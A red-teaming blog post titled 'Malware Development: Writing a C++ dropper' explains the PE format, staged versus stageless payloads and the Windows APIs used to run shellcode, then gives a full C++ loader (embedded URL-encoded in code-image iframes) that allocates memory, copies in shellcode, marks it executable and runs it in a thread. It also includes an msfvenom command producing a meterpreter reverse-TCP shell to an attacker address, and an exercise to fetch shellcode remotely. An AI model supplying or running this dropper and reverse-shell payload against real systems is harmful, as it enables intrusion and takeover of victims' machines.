---
title: "Malware Development: Writing a C++ dropper"
author: "Trevor Saudi"
date: 2023-07-19
description: "Malware Development: Writing a C++ dropper"
image: "/posts/2023-07-19_red_team01/images/logo.png"
tags:
- Red Teaming
- Malware Development

---
![image](/posts/2023-07-19_red_team02/images/logo.png)


## Introduction
- Welcome to another red teaming blog post where we dive into malware development and how we can write malware using C/C++. 
- We will go over some fundamentals such as the PE file structure, Windows APIs then finally see how we can put together a dropper that executes shellcode for us on a target system

## Prerequisites

- Windows 10 box
- Any IDE
- Basic programming knowledge


## Why?

- In my red teaming journey, the emphasis on writing custom toolset always plays a big role in understanding the current threat landscape, emulating what adversaries are doing and I guess... it's just fun!

## The PE file structure

- The `portable executable` also called the Windows executable file format is a data structure that in Windows that holds information necessary for the execution of files. 
- It is used to `organize executable files, object files, DLLs, FON Font files` in 32-bit and 64-bit versions of Windows operating systems.
- Understanding the organization of file components in a PE is very important when it comes to the `design and analysis` of malware. 

- In the analysis and development of malware, it is important to be familiar with the PE file structure to understand how malware works on a basic level, what it does from a behavioral analysis point of view, such as how it interacts with the operating system, antivirus or EDR in place and how it communicates externally. etc
- In its simplest form, the PE file format is organized as follows:

    ![image](/posts/2023-07-19_red_team02/images/image1.png)

### Headers

- It takes up the first 64 bytes and holds various metadata about the executable file. 
- Its components include:

 | Component               | Description                                                                                   |
| ----------------------- | --------------------------------------------------------------------------------------------- |
| `DOS Header`            | This section identifies an MS-DOS compatible file type using the "MZ" initials.              |
| `DOS stub`              | This is what prints out "This program cannot be run in DOS mode" when executed in DOS.       |
| `PE File Header`        | Contains the signature that identifies the executable as a PE.                               |
| `Image Optional Header` | Holds optional information about a PE, such as the base address of the image in memory, sizes of the code/data sections, the entry point relative virtual address, etc. |
| `Sections Header`       | Describes attributes of sections in the PE, such as name, size, virtual address, attributes (readable, writable, executable). |

### Sections
- These are the components that make up the PE sections:

| Component | Description                                    |
| --------- | ---------------------------------------------- |
| `.text`     | Contains executable code.                      |
| `.data`     | Holds initialized data.                         |
| `.bss`      | Stores uninitialized data.                      |
| `.rsrc`     | Stores non-executable resources.                |
| `.idata`    | Lists imported functions and libraries.         |
| `.edata`   | Lists exported functions and symbols.           |
| `.pdata`    | Contains exception handling information.        |
| `.debug`    | Holds debugging-related data.                   |


## Staged vs Stageless

- Both of these are different approaches used in thedelivery of malware
- `Stageless malware` is `standalone self-contained malware` that does not rely on external resources to complete execution.
- `Staged malware` follows a different approach. It contains `multiple processes`, usually 2 or more phases where the first, commonly referred to as the `stager`, is a small piece of code responsible for establishing a C2 connection with the infrastructure. Its main functionality is to `load the subsequent stage of the malware.`
- A common example is the metasploit framework where stageless payloads have the following notation: <kbd>meterpreter_</kbd>:

```
   1. payload/windows/meterpreter_bind_tcp 
```

 - While the staged have the following notation: <kbd>meterpreter/</kbd>:

 
```bash
   2. payload/windows/meterpreter/bind_tcp        
```

- Both have their cons and pros where we see staged payloads being more evasive and capable of bypassing AVs due to execution of malware in separate stages. Stageless are good when maintaining simplicity but can be bulky to deliver. We will look into both ways developing these malware.

## Shellcode 

- Shellcode is a `set of instructions` that is meant to be executed directly by a target system. Once it's executed, it could provide a callback `connection to the attacker or execute arbitrary commands` on the target.
- It is typically written in `assembly`, designed to be super-efficient while leveraging various system calls or APIs to achieve the intended goal
- We can quickly generate shellcode using `msfvenom` as follows:

```bash
➜  ~ msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=192.168.100.72 LPORT=443 EXITFUNC=thread -f C

```


## Windows APIs

- Windows APIs play a key role in malware development as they create a standardized interface for the malware `to interact with the Operating System`.
- The `Windows API` is a collection of functions, data structures, and constants provided by the Windows OS. 
- It allows developers to create applications that can interact with the underlying resources.
- The APIs are well documented [here](https://learn.microsoft.com/en-us/docs/) and we will be using it as a reference



---

### MessageBox API

- We will write our first program that uses the MessageBox API to display some text. The implementation of the API is well documented as shown:

    ![image](/posts/2023-07-19_red_team02/images/image7.png)

- In your IDE, we can import the relevant libraries and implement the API as shown in the [docs](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-messagebox)
<iframe
  src="https://carbon.now.sh/embed?bg=rgba%280%2C0%2C202%2C0%29&t=panda-syntax&wt=sharp&l=text%2Fx-c%2B%2Bsrc&width=768&ds=false&dsyoff=20px&dsblur=68px&wc=true&wa=false&pv=0px&ph=0px&ln=false&fl=1&fm=Fira+Code&fs=14px&lh=143%25&si=false&es=2x&wm=false&code=%252F%252F%2520Importing%2520necessary%2520libraries%250A%2523include%2520%253Cwindows.h%253E%250A%250Aint%2520main%28%29%250A%257B%250A%250A%2520%2520%2520%2520%252F%252F%2520Implementing%2520the%2520MessageBox%2520API%250A%2520%2520%2520%2520MessageBox%28NULL%252C%2520L%2522Happy%2520Hacking%2522%252C%2520L%2522Greetings%2522%252C%2520MB_OK%29%253B%250A%2520%2520%2520%2520return%25200%253B%250A%257D"
  style="width: 783px; height: 277px; border:0; transform: scale(1); overflow:hidden;"
  sandbox="allow-scripts allow-same-origin">
</iframe>

  ![image](/posts/2023-07-19_red_team02/images/gif2.gif)

- Let's move on to the APIs necessary to implement for our dropper.

### [VirtualAlloc](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc)

- This API is used in reserving regions of memory within the virtual address space of a process. 

<br>

<iframe
  src="https://carbon.now.sh/embed?bg=rgba%280%2C0%2C202%2C0%29&t=panda-syntax&wt=sharp&l=text%2Fx-c%2B%2Bsrc&width=768&ds=false&dsyoff=20px&dsblur=68px&wc=true&wa=false&pv=0px&ph=0px&ln=false&fl=1&fm=Fira+Code&fs=14px&lh=143%25&si=false&es=2x&wm=false&code=LPVOID%2520VirtualAlloc%28%250A%2520%2520%2520LPVOID%2520lpAddress%252C%250A%2520%2520%2520SIZE_T%2520dwSize%252C%250A%2520%2520%2520DWORD%2520%2520flAllocationType%252C%250A%2520%2520%2520DWORD%2520%2520flProtect%250A%29%253B"
  style="width: 783px; height: 220px; border:0; transform: scale(1); overflow:hidden;"
  sandbox="allow-scripts allow-same-origin">
</iframe>


- We will use this to allocate necessary space for storing the shellcode.


### [RtlMoveMemory](https://learn.microsoft.com/en-us/windows/win32/devnotes/rtlmovememory)

- This memory manipulation function is used to copy a block of memory from one location to another. 


<iframe
  src="https://carbon.now.sh/embed?bg=rgba%280%2C0%2C202%2C0%29&t=panda-syntax&wt=sharp&l=text%2Fx-c%2B%2Bsrc&width=768.65625&ds=false&dsyoff=20px&dsblur=68px&wc=true&wa=false&pv=0px&ph=0px&ln=false&fl=1&fm=Fira+Code&fs=14px&lh=143%25&si=false&es=2x&wm=false&code=void%2520RtlMoveMemory%28%250A%2520%2520PVOID%2520%2520Destination%252C%250A%2520%2520const%2520VOID%2520%2520%2520*Source%252C%250A%2520%2520SIZE_T%2520Length%250A%29%253B%250A"
  style="width: 783px; height: 220px; border:0; transform: scale(1); overflow:hidden;"
  sandbox="allow-scripts allow-same-origin">
</iframe>

- We will use this to copy the shellcode into the memory allocated by VirtualAlloc
### [VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)


- The `VirtualProtect` function changes the protection settings of a region of virtual memory. We will use it to modify permissions of the memory block we copied our shellcode to, in this case we add executable and read permissions to be able to execute our shellcode


<iframe
  src="https://carbon.now.sh/embed?bg=rgba%280%2C0%2C202%2C0%29&t=panda-syntax&wt=sharp&l=text%2Fx-c%2B%2Bsrc&width=768.65625&ds=false&dsyoff=20px&dsblur=68px&wc=true&wa=false&pv=0px&ph=0px&ln=false&fl=1&fm=Fira+Code&fs=14px&lh=143%25&si=false&es=2x&wm=false&code=BOOL%2520VirtualProtect%28%250A%2520%2520LPVOID%2520lpAddress%252C%250A%2520%2520SIZE_T%2520dwSize%252C%250A%2520%2520DWORD%2520%2520flNewProtect%252C%250A%2520%2520PDWORD%2520lpflOldProtect%250A%29%253B"
  style="width: 783px; height: 220px; border:0; transform: scale(1); overflow:hidden;"
  sandbox="allow-scripts allow-same-origin">
</iframe>

### [CreateThread](//https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createthread)

- We use this to create a thread that is executed within the address space of another process. This is what runs our shellcode.


<iframe
  src="https://carbon.now.sh/embed?bg=rgba%280%2C0%2C202%2C0%29&t=panda-syntax&wt=sharp&l=text%2Fx-c%2B%2Bsrc&width=768.65625&ds=false&dsyoff=20px&dsblur=68px&wc=true&wa=false&pv=0px&ph=0px&ln=false&fl=1&fm=Fira+Code&fs=14px&lh=143%25&si=false&es=2x&wm=false&code=HANDLE%2520CreateThread%28%250A%2520%2520LPSECURITY_ATTRIBUTES%2520%2520%2520lpThreadAttributes%252C%250A%2520%2520SIZE_T%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520dwStackSize%252C%250A%2520%2520LPTHREAD_START_ROUTINE%2520%2520lpStartAddress%252C%250A%2520%2520LPVOID%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520lpParameter%252C%250A%2520%2520DWORD%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520dwCreationFlags%252C%250A%2520%2520LPDWORD%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520lpThreadId%250A%29%253B%250A"
  style="width: 783px; height: 220px; border:0; transform: scale(1); overflow:hidden;"
  sandbox="allow-scripts allow-same-origin">
</iframe>

### [WaitForSingleObject](//https://docs.microsoft.com/en-us/windows/desktop/api/synchapi/nf-synchapi-waitforsingleobject)


- It is used to wait until the specified object is in a certain state or until a timeout interval elapses. We use this to have our shellcode running infinitely till a failure is encountered

<iframe
  src="https://carbon.now.sh/embed?bg=rgba%280%2C0%2C202%2C0%29&t=panda-syntax&wt=sharp&l=text%2Fx-c%2B%2Bsrc&width=768.65625&ds=false&dsyoff=20px&dsblur=68px&wc=true&wa=false&pv=0px&ph=0px&ln=false&fl=1&fm=Fira+Code&fs=14px&lh=143%25&si=false&es=2x&wm=false&code=DWORD%2520WaitForSingleObject%28%250A%2520%2520HANDLE%2520hHandle%252C%250A%2520%2520DWORD%2520%2520dwMilliseconds%250A%29%253B%250A"
  style="width: 783px; height: 220px; border:0; transform: scale(1); overflow:hidden;"
  sandbox="allow-scripts allow-same-origin">
</iframe>

## The Stageless implant


- Putting together the above APIs, we have the following C++ stageless implant that executes shellcode for us.


{{< alert >}}

Note that some of the APIs have optional parameters which we don't have to put values, we put a 0 in place
{{< /alert >}}



<iframe
  src="https://carbon.now.sh/embed?bg=rgba%280%2C0%2C202%2C0%29&t=panda-syntax&wt=sharp&l=text%2Fx-c%2B%2Bsrc&width=768&ds=false&dsyoff=20px&dsblur=68px&wc=true&wa=false&pv=0px&ph=0px&ln=false&fl=1&fm=Fira+Code&fs=14px&lh=143%25&si=false&es=2x&wm=false&code=%2523include%2520%253Cwindows.h%253E%250A%2523include%2520%253Cstdio.h%253E%250A%2523include%2520%253Cstdlib.h%253E%250A%2523include%2520%253Cstring.h%253E%250A%250Aint%2520main%28void%29%2520%257B%250A%250A%2509void*%2520exec_mem%253B%250A%2509BOOL%2520rv%253B%250A%2509HANDLE%2520th%253B%250A%2509DWORD%2520oldprotect%2520%253D%25200%253B%250A%250A%2509unsigned%2520char%2520payload%255B%255D%2520%253D%2520%257B%250A%2509%2509%252F%252F%2520shellcode%2520to%2520open%2520notepad%250A%2509%25200xfc%252C0x48%252C0x83%252C0xe4%252C0xf0%252C0xe8%252C0xc0%252C0x00%252C0x00%252C0x00%252C0x41%252C0x51%252C0x41%252C0x50%250A%2509%252C0x52%252C0x51%252C0x56%252C0x48%252C0x31%252C0xd2%252C0x65%252C0x48%252C0x8b%252C0x52%252C0x60%252C0x48%252C0x8b%252C0x52%250A%2509%252C0x18%252C0x48%252C0x8b%252C0x52%252C0x20%252C0x48%252C0x8b%252C0x72%252C0x50%252C0x48%252C0x0f%252C0xb7%252C0x4a%252C0x4a%250A%2509%252C0x4d%252C0x31%252C0xc9%252C0x48%252C0x31%252C0xc0%252C0xac%252C0x3c%252C0x61%252C0x7c%252C0x02%252C0x2c%252C0x20%252C0x41%250A%2509%252C0xc1%252C0xc9%252C0x0d%252C0x41%252C0x01%252C0xc1%252C0xe2%252C0xed%252C0x52%252C0x41%252C0x51%252C0x48%252C0x8b%252C0x52%250A%2509%252C0x20%252C0x8b%252C0x42%252C0x3c%252C0x48%252C0x01%252C0xd0%252C0x8b%252C0x80%252C0x88%252C0x00%252C0x00%252C0x00%252C0x48%250A%2509%252C0x85%252C0xc0%252C0x74%252C0x67%252C0x48%252C0x01%252C0xd0%252C0x50%252C0x8b%252C0x48%252C0x18%252C0x44%252C0x8b%252C0x40%250A%2509%252C0x20%252C0x49%252C0x01%252C0xd0%252C0xe3%252C0x56%252C0x48%252C0xff%252C0xc9%252C0x41%252C0x8b%252C0x34%252C0x88%252C0x48%250A%2509%252C0x01%252C0xd6%252C0x4d%252C0x31%252C0xc9%252C0x48%252C0x31%252C0xc0%252C0xac%252C0x41%252C0xc1%252C0xc9%252C0x0d%252C0x41%250A%2509%252C0x01%252C0xc1%252C0x38%252C0xe0%252C0x75%252C0xf1%252C0x4c%252C0x03%252C0x4c%252C0x24%252C0x08%252C0x45%252C0x39%252C0xd1%250A%2509%252C0x75%252C0xd8%252C0x58%252C0x44%252C0x8b%252C0x40%252C0x24%252C0x49%252C0x01%252C0xd0%252C0x66%252C0x41%252C0x8b%252C0x0c%250A%2509%252C0x48%252C0x44%252C0x8b%252C0x40%252C0x1c%252C0x49%252C0x01%252C0xd0%252C0x41%252C0x8b%252C0x04%252C0x88%252C0x48%252C0x01%250A%2509%252C0xd0%252C0x41%252C0x58%252C0x41%252C0x58%252C0x5e%252C0x59%252C0x5a%252C0x41%252C0x58%252C0x41%252C0x59%252C0x41%252C0x5a%250A%2509%252C0x48%252C0x83%252C0xec%252C0x20%252C0x41%252C0x52%252C0xff%252C0xe0%252C0x58%252C0x41%252C0x59%252C0x5a%252C0x48%252C0x8b%250A%2509%252C0x12%252C0xe9%252C0x57%252C0xff%252C0xff%252C0xff%252C0x5d%252C0x48%252C0xba%252C0x01%252C0x00%252C0x00%252C0x00%252C0x00%250A%2509%252C0x00%252C0x00%252C0x00%252C0x48%252C0x8d%252C0x8d%252C0x01%252C0x01%252C0x00%252C0x00%252C0x41%252C0xba%252C0x31%252C0x8b%250A%2509%252C0x6f%252C0x87%252C0xff%252C0xd5%252C0xbb%252C0xf0%252C0xb5%252C0xa2%252C0x56%252C0x41%252C0xba%252C0xa6%252C0x95%252C0xbd%250A%2509%252C0x9d%252C0xff%252C0xd5%252C0x48%252C0x83%252C0xc4%252C0x28%252C0x3c%252C0x06%252C0x7c%252C0x0a%252C0x80%252C0xfb%252C0xe0%250A%2509%252C0x75%252C0x05%252C0xbb%252C0x47%252C0x13%252C0x72%252C0x6f%252C0x6a%252C0x00%252C0x59%252C0x41%252C0x89%252C0xda%252C0xff%250A%2509%252C0xd5%252C0x6e%252C0x6f%252C0x74%252C0x65%252C0x70%252C0x61%252C0x64%252C0x2e%252C0x65%252C0x78%252C0x65%252C0x00%250A%2509%257D%253B%250A%250A%2520%2520%2520%2520unsigned%2520int%2520payload_len%2520%253D%2520350%253B%250A%250A%2509%252F%252F%2520Allocate%2520a%2520memory%2520buffer%2520for%2520payload%250A%2509exec_mem%2520%253D%2520VirtualAlloc%280%252C%2520payload_len%252C%2520MEM_COMMIT%2520%257C%2520MEM_RESERVE%252C%2520PAGE_READWRITE%29%253B%250A%2520%2520%2520%2520%252F%252F%2520Copy%2520payload%2520to%2520new%2520buffer%250A%2509RtlMoveMemory%28exec_mem%252C%2520payload%252C%2520payload_len%29%253B%250A%2509%252F%252F%2520Make%2520new%2520buffer%2520as%2520executable%250A%2509rv%2520%253D%2520VirtualProtect%28exec_mem%252C%2520payload_len%252C%2520PAGE_EXECUTE_READ%252C%2520%2526oldprotect%29%253B%250A%2509%252F%252F%2520If%2520all%2520good%252C%2520run%2520the%2520payload%250A%2509if%2520%28rv%2520%21%253D%25200%29%2520%257B%250A%2509%2509th%2520%253D%2520CreateThread%280%252C%25200%252C%2520%28LPTHREAD_START_ROUTINE%29exec_mem%252C%25200%252C%25200%252C%25200%29%253B%250A%2509%2509WaitForSingleObject%28th%252C%2520-1%29%253B%250A%2509%257D%250A%250A%2509return%25200%253B%250A%257D"
  style="width: 783px; height: 1100px; border:0; transform: scale(1); overflow:hidden;"
  sandbox="allow-scripts allow-same-origin">
</iframe>


![image](/posts/2023-07-19_red_team02/images/gif1.gif)

## Exercise

- You can build upon the above code by making it staged, such that it pulls shellcode from a remote source, loads it into a byte array then proceeds with the execution routine.
